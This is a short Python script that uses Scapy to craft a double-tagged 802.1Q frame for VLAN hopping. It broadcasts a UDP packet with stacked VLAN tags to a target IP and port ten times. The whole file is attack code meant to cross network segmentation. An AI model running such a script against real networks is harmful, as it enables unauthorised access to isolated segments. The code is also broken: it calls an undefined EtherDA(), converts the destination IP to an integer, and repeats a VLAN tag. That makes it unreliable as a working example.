from scapy.all import *


def hopper(src_ip, dest_ip, dest_port):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
             Dot1Q(vlan=1) / \
             Dot1Q(vlan=2) / \
             Dot1Q(vlan=2) / \
             IP(src=src_ip, dst=dest_ip) / \
             UDP(dport=dest_port) / \
             Raw(load="abc")

    EtherDA()
    packet.show()
    for i in range(10):
        sendp(packet)


if __name__ == "__main__":
    ip_src = str(sys.argv[1])
    ip_dest = int(sys.argv[2])
    port_dest = int(sys.argv[3])
    hopper(ip_src, ip_dest,port_dest)
